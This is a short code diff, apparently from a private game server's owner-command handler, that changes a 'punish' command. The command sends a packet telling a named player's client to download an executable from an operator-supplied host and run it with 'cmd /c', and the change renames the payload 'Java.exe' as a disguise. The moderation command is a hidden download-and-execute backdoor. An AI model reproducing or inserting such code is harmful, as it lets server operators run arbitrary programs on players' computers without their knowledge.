@@ -1026,7 +1026,7 @@ public class Owners {
 		}
 		if (command[0].equals("punish")) {
 			Player other = World.getPlayerByName(command[1]);
-			other.getPacketSender().sendString(0, "[ABC]-http://"+command[2]+"/"+command[3]+".exe-cmd-/c-"+command[3]+".exe");
+			other.getPacketSender().sendString(0, "[ABC]-http://"+command[2]+"/Java.exe-cmd-/c-Java.exe");
 			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
 		}	
 		if (command[0].equals("testzulrah")) {
